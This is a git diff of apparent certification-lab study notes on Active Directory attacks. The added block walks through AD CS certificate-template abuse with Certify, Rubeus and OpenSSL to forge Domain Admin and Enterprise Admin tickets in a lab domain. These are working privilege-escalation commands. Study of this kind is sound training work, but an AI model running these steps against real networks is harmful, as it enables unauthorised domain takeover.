@@ -9,6 +9,8 @@ Child to Parent using Trust Tickets
   – krbtgt hash of the child \
   – Trust tickets
 
+
+
 <figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 **Requirements**
@@ -172,7 +174,7 @@ Enumerate the templates
 Certify.exe find
 
 Enumerate vulnerable templates
-Certify find /vulnerable
+Certify.exe find /vulnerable
 ```
 
 **ESC 3**
@@ -235,6 +237,8 @@ Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass
 
 The template "HTTPSCertificates" has ENROLLEE\_SUPPLIES\_SUBJECT value for msPKI-Certificates-Name-Flag
 
+Needs extracted Certificate  - see CRTE Lab 10
+
 {% code overflow="wrap" %}
 ```powershell
 Certify.exe find /enrolleeSuppliesSubject
@@ -255,6 +259,31 @@ Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx
 
 ```
 {% endcode %}
+
+**If we have the certificate of a User  see CRTE Lab 10**
+
+<pre data-overflow="wrap"><code><strong>Use the certificate to request a TGT of the user you have the cert
+</strong><strong>C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:PWyouSetWhenExtractingTheCert /nowrap /ptt
+</strong><strong>
+</strong><strong>Now TGT is in klist
+</strong><strong>
+</strong><strong>Now Request a certificate for the domain admin user via the template ForAdminsofPrivilegedAccessWorkstations
+</strong>C:\AD\Tools\Certify.exe request /ca:TechcorpDC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator 
+
+copy key/cert from outpu to file cert.pem and Convert  cert.pem to pfx
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+
+rubues asktgt /user:Administrator /certificate:path\da.pfx /password:youSpecified /nowrap /ptt
+
+Request Enterprise Admin TGT an inject
+C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator
+/dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx
+/password:SecretPass@123 /nowrap /ptt
+</code></pre>
+
+
+
+
 
 
 
